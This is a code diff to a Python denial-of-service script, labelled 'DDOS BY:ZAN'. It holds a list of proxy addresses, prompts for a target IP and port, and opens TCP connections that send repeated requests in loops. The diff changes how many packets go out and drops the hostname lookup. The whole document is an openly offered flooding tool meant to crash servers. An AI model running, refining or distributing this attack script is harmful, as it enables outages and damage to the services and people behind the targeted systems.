@@ -1,5 +1,6 @@
 import threading
 import os, sys
+import time
 import socket, requests
 import random
 userip = ["""45.68.71.21:8080
@@ -254,11 +255,10 @@ print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |   UDP    |
               """)
 ip = str(input("IP ATTACK>="))
-ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
-def randomip():
+def randomip(th):
   randip = [192, 168, 0, 1]
   randip1 = random.randint(3,255)
   randip2 = random.randint(3,255)
@@ -278,6 +278,7 @@ def randomip():
   return(randip)
 
 def start():
+  time.sleep(3)
   global userip, acceptall, all, useragents
   hh = random._urandom(999999)
   xx = int(0)
@@ -296,9 +297,9 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            s.send(str.encode(main_req))
-            s.send(str.encode(main_req))
             for i in range(pack):
+                s.send(str.encode(main_req))
+            for i in range(th):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
